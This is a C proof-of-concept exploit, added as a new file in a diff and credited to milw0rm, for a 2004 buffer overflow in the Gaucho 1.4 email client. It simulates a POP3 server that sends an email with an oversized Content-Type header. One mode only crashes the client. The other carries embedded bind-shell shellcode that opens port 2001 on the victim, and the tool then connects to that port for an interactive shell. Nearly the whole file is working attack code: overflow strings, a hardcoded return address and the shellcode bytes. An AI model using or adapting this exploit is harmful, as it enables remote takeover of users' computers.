@@ -1,0 +1,445 @@
+//************************************************************************** 
+// Gaucho Ver 1.4 Mail Client Buffer Overflow Vulnerability 
+// Bind Shell POC Validation Code for English Win2K SP4 
+// 10 Aug 2004 
+// 
+// Gaucho is an Email client developed by NakedSoft for Microsoft Windows 
+// platforms.   Gaucho supports SMTP, POP3 and other email delivery protocols. 
+// Gaucho version 1.4 is vulnerable to a buffer overflow when receiving 
+// malformed emails from a POP3 server.   This vulnerability is triggered if the 
+// POP3 server returns a specially crafted email that has an abnormally long 
+// string in the Content-Type field of the email header. This string will 
+// overwrite EIP via SEH, and can be exploited to execute arbitrary code. 
+// 
+// This POC code simulates a POP3 server that sends a specially crafted email 
+// to Gaucho, triggering the overflow and binds shell on port 2001 of a vulnerable 
+// Gaucho email client. 
+// 
+// Tested on Win2K SP4, you must find the address of JMP EDI instruction that 
+// is suitable for your system. 
+// 
+// Advisory 
+// http://www.security.org.sg/vuln/gaucho140.html 
+// 
+// Greetz: snooq, sk, and all guys at SIG^2 (www.security.org.sg) 
+// 
+//************************************************************************** 
+
+#include <winsock2.h> 
+#include <windows.h> 
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <conio.h> 
+#pragma comment(lib,"ws2_32.lib") 
+
+bool tcpInit() 
+{ 
+WORD wVersionRequested; 
+WSADATA wsaData; 
+int err; 
+
+wVersionRequested = MAKEWORD( 2, 0 ); 
+
+err = WSAStartup( wVersionRequested, &wsaData ); 
+if ( err != 0 ) { 
+return false; 
+} 
+  
+if (LOBYTE( wsaData.wVersion ) != 2 || 
+        HIBYTE( wsaData.wVersion ) != 0 ) 
+{ 
+WSACleanup(); 
+return false; 
+} 
+
+return true; 
+} 
+
+
+SOCKET tcpListen(int port) 
+{ 
+    SOCKET sock; 
+
+sock = socket(AF_INET, SOCK_STREAM, 0); 
+
+if(sock == INVALID_SOCKET) 
+return sock; 
+
+sockaddr_in sin; 
+
+sin.sin_addr.s_addr = htonl(INADDR_ANY); 
+sin.sin_family = AF_INET; 
+sin.sin_port = htons(port); 
+
+if(bind(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) 
+{ 
+printf("Error in bind().n"); 
+closesocket(sock); 
+return INVALID_SOCKET; 
+} 
+
+if(listen(sock, 5) == SOCKET_ERROR) 
+{ 
+printf("Error in bind().n"); 
+closesocket(sock); 
+return INVALID_SOCKET; 
+} 
+
+return sock; 
+} 
+
+
+DWORD resolveIP(char *hostName) 
+{ 
+hostent *hent; 
+char **addresslist; 
+DWORD result = 0; 
+
+hent = gethostbyname(hostName); 
+if(hent) 
+{ 
+addresslist = hent->h_addr_list; 
+
+if (*addresslist) 
+{ 
+result = *((DWORD *)(*addresslist)); 
+} 
+} 
+
+return result; 
+} 
+
+
+SOCKET tcpConnect(char *host, int port) 
+{ 
+    SOCKET sock; 
+
+sock = socket(AF_INET, SOCK_STREAM, 0); 
+
+if(sock == INVALID_SOCKET) 
+return sock; 
+
+sockaddr_in sin; 
+
+DWORD ip = resolveIP(host); 
+if(ip == 0) 
+ip = inet_addr(host); 
+
+sin.sin_addr.s_addr = ip; 
+sin.sin_family = AF_INET; 
+sin.sin_port = htons(port); 
+
+    if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) 
+{ 
+printf("Connect failed.n"); 
+closesocket(sock); 
+return INVALID_SOCKET; 
+} 
+
+return sock; 
+} 
+
+
+void shell(int sockfd) 
+{ 
+char buffer[1024]; 
+fd_set rset; 
+FD_ZERO(&rset); 
+
+for(;;) 
+{ 
+if(kbhit() != 0) 
+{ 
+fgets(buffer, sizeof(buffer) - 2, stdin); 
+send(sockfd, buffer, strlen(buffer), 0); 
+} 
+
+FD_ZERO(&rset); 
+FD_SET(sockfd, &rset); 
+
+timeval tv; 
+tv.tv_sec = 0; 
+tv.tv_usec = 50; 
+
+if(select(0, &rset, NULL, NULL, &tv) == SOCKET_ERROR) 
+{ 
+printf("select errorn"); 
+break; 
+} 
+        
+if(FD_ISSET(sockfd, &rset)) 
+{ 
+int n; 
+
+ZeroMemory(buffer, sizeof(buffer)); 
+if((n = recv(sockfd, buffer, sizeof(buffer), 0)) <= 0) 
+{ 
+printf("EOFn"); 
+exit(0); 
+} 
+else 
+{ 
+fwrite(buffer, 1, n, stdout); 
+} 
+} 
+} 
+} 
+
+
+#define OK_MSG"+OK POC POP3 server for Gaucho Ver 1.4 Vulnerability ready.rn" 
+#define STAT_REPLY"+OK 1 1rn" 
+
+
+char UIDL_REPLY[] = 
+"1 0123456789012345678901234567890123456789rn.rn"; 
+
+
+unsigned char bindShellEmail[] = 
+"Date: Mon, 09 Aug 2004 19:44:13 +0800rn" 
+"Subject: Testingrn" 
+"To: a@aaaaaa.xxxrn" 
+"From: XX <xx@xxxxxxxx.xxx.xx>rn" 
+"Message-ID: <GM109205179359A000.b76.xx@xxxxxxxx.xxx.xx>rn" 
+"MIME-Version: 1.0rn" 
+"Content-Type: " 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG1HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG" 
+"x37x55x62x76"// overwrites EIP via SEH, address of JMP EDI in MPR.dll 
+// this address must be carefully chosen due to the filtering that is done 
+// on the header messages. 
+
+"IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG3HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG4HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG5HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG6HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG7HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG8HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG9HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGAHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGBHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGCHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG" 
+"xEBx60"// FIRST jmp lands us here, do a SECOND jmp to land onto shellcode 
+"HHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+";" 
+"x90x90xEBx61"// JMP EDI lands here, do the FIRST jmp here to reach the SECOND jmp 
+"set=US-ASCIIrn" 
+"rn" 
+"x90x90"// shellcode sent in email body to avoid filtering (bindshell on 2001) 
+"xEBx62x55x8BxECx51x56x57x8Bx5Dx08x8Bx73x3Cx8Bx74" 
+"x33x78x03xF3x8Bx7Ex20x03xFBx8Bx4Ex18x56x33xD2x8B" 
+"x37x03x75x08x33xDBx33xC0xACx85xC0x74x09xC1xCBx0C" 
+"xD1xCBx03xD8xEBxF0x3Bx5Dx0Cx74x0Bx83xC7x04x42xE2" 
+"xDEx5Ex33xC0xEBx17x5Ex8Bx7Ex24x03x7Dx08x66x8Bx04" 
+"x57x8Bx7Ex1Cx03x7Dx08x8Bx04x87x03x45x08x5Fx5Ex59" 
+"x8BxE5x5DxC3x55x8BxECx33xC9xB1xC8x2BxE1x32xC0x8B" 
+"xFCxF3xAAxB1x30x64x8Bx01x8Bx40x0Cx8Bx70x1CxADx8B" 
+"x58x08x89x5DxFCx68x8Ex4Ex0ExECxFFx75xFCxE8x70xFF" 
+"xFFxFFx83xC4x08xBBxAAxAAx6Cx6CxC1xEBx10x53x68x33" 
+"x32x2Ex64x68x77x73x32x5Fx54xFFxD0x89x45xF8xEBx35" 
+"x5Ex8Dx7DxF4x33xC9xB1x09xFFx36xFFx75xFCxE8x40xFF" 
+"xFFxFFx83xC4x08x85xC0x75x0Ex90xFFx36xFFx75xF8xE8" 
+"x2ExFFxFFxFFx83xC4x08x89x07x33xC0xB0x04x03xF0x2B" 
+"xF8xE2xD5xEBx29xE8xC6xFFxFFxFFx72xFExB3x16x35x54" 
+"x8AxA1xA4xADx2ExE9xA4x1Ax70xC7xD9x09xF5xADxCBxED" 
+"xFCx3BxEFxCExE0x60xE7x79xC6x79xADxD9x05xCEx54x6A" 
+"x02xFFx55xE0x33xC0x50x50x50x50x6Ax01x6Ax02xFFx55" 
+"xE4x89x45xD0x33xC0x50xB8xFDxFFxF8x2Ex83xF0xFFx50" 
+"x8BxC4x6Ax10x50xFFx75xD0xFFx55xE8x6Ax05xFFx75xD0" 
+"xFFx55xECx85xC0x75x68x8BxCCx6Ax10x8BxDCx33xC0x50" 
+"x50x53x51xFFx75xD0xFFx55xF0x8BxD0x5Bx83xF0xFFx74" 
+"x4Ex8BxFCx33xC9xB1x64x33xC0xF3xAAxC6x04x24x44x66" 
+"xC7x44x24x2Cx01x01x89x54x24x38x89x54x24x3Cx89x54" 
+"x24x40x8BxC4x8Dx58x44xB9xFFx63x6Dx64xC1xE9x08x51" 
+"x8BxCCx52x53x53x50x33xC0x50x50x50x6Ax01x50x50x51" 
+"x50xFFx55xF4x5Bx6AxFFxFFx33xFFx55xD4xFFx55xD8xFF" 
+"x75xD0xFFx55xD8x50xFFx55xDC" 
+"rn" 
+".rn"; 
+
+unsigned char pocEmail[] = 
+"Date: Mon, 09 Aug 2004 19:44:13 +0800rn" 
+"Subject: Testingrn" 
+"To: a@aaaaaa.xxxrn" 
+"From: XX <xx@xxxxxxxx.xxx.xx>rn" 
+"Message-ID: <GM109205179359A000.b76.xx@xxxxxxxx.xxx.xx>rn" 
+"MIME-Version: 1.0rn" 
+"Content-Type: " 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG1HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG" 
+"HHHH"// overwrites EIP via SEH 
+"IIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG3HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG4HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG5HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG6HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG7HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG8HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGG9HHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGAHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGBHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGCHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"AAAABBBBCCCCDDDDEEEEFFFFGGGGDHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" 
+"; charset=US-ASCIIrn" 
+"Content-Transfer-Encoding: 7bitrn" 
+"X-Mailer: Gaucho Version 1.4.0 Build 145rn" 
+"rn" 
+"Testingrn" 
+"rn" 
+".rn"; 
+
+
+void genUIDLreply(char *ptr) 
+{ 
+srand(GetTickCount()); 
+for(int i = 2; i < 42; i++) 
+{ 
+ptr = (rand() % 94) + 0x21; 
+} 
+} 
+
+void printUsage(char *filename) 
+{ 
+printf("nUsage: %s <mode>nn", filename); 
+printf("   Mode can be:n"); 
+printf("   1 - POC Crashn" 
+  "   2 - Bindshell on Port 2001 (JMP EDI address is hardcoded for Win2K SP4)nn"); 
+} 
+
+int main(int argc, char* argv[]) 
+{ 
+printf("Proof-of-Concept POP3 server for Gaucho Ver 1.4 Vulnerabilityn"); 
+if(argc != 2) 
+{ 
+printUsage(argv[0]); 
+return 1; 
+} 
+
+int mode = atoi(argv[1]); 
+if(mode != 1 && mode != 2) 
+{ 
+printf("nINVALID MODE!n"); 
+printUsage(argv[0]); 
+return 1; 
+} 
+
+if(!tcpInit()) 
+{ 
+printf("Cannot start Winsock!n"); 
+return 1; 
+} 
+SOCKET s = tcpListen(110); 
+if(s == INVALID_SOCKET) 
+{ 
+printf("Cannot create listening socket!n"); 
+return 1; 
+} 
+printf("Listening on POP3 port 110...n"); 
+
+struct sockaddr_in sin; 
+int sin_size = sizeof(sin); 
+SOCKET client = WSAAccept(s, (SOCKADDR *)&sin, &sin_size, NULL, 0); 
+char buffer[1024]; 
+int recvSize; 
+
+if(client != INVALID_SOCKET) 
+{ 
+// POP3 banner 
+send(client, OK_MSG, strlen(OK_MSG), 0); 
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+
+// OK to USER 
+send(client, OK_MSG, strlen(OK_MSG), 0); 
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+
+// OK to PASS 
+send(client, OK_MSG, strlen(OK_MSG), 0); 
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+
+// REPLY to STAT 
+send(client, STAT_REPLY, strlen(STAT_REPLY), 0); 
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+
+// REPLY to UIDL 
+genUIDLreply(UIDL_REPLY); 
+send(client, STAT_REPLY, strlen(STAT_REPLY), 0); 
+send(client, UIDL_REPLY, strlen(UIDL_REPLY), 0); 
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+
+// REPLY to LIST 
+send(client, STAT_REPLY, strlen(STAT_REPLY), 0); 
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+
+if(mode == 1) 
+{ 
+// send malicious email 
+send(client, (char *)pocEmail, strlen((char *)pocEmail), 0); 
+printf("POC crash email sent...n"); 
+
+recvSize = recv(client, buffer, sizeof(buffer), 0); 
+if(recvSize <= 0) 
+return 1; 
+
+fwrite(buffer, recvSize, 1, stdout); 
+} 
+else 
+{ 
+// send malicious email 
+send(client, (char *)bindShellEmail, strlen((char *)bindShellEmail), 0); 
+printf("Bindshell email sent.   Sleeping for 2 seconds...n"); 
+Sleep(2000); 
+
+//================================= Connect to the target ============================== 
+SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); 
+if(sock == INVALID_SOCKET) 
+{ 
+printf("Invalid socket return in socket() call.n"); 
+WSACleanup(); 
+return -1; 
+} 
+
+sin.sin_family = AF_INET; 
+sin.sin_port = htons(2001); 
+
+if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) 
+{ 
+printf("Exploit Failed. SOCKET_ERROR return in connect call.n"); 
+closesocket(sock); 
+WSACleanup(); 
+return -1; 
+} 
+
+printf("n"); 
+shell(sock); 
+} 
+} 
+
+return 0; 
+} 
+
+// milw0rm.com [2004-08-27]
